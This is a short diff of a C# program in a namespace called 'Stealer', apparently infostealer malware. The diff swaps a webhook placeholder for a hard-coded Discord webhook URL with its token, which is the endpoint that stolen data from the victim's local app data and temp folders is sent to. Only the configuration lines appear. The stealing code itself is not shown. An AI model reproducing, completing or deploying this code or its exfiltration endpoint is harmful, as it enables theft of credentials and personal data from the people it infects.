@@ -22,7 +22,7 @@ namespace Stealer
 
         public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
-        public static Webhook wh = new Webhook("%INSERT_WEBHOOK%");
+        public static Webhook wh = new Webhook("https://discord.com/api/webhooks/1041375671106162748/ZTkJVsOZX4tmCqW5A_HTJRi9aV3rqFMa--InUS6jBOmwX9tyVHqJ1HWulhBBCboqKqAL");
         
         
         static void Main()
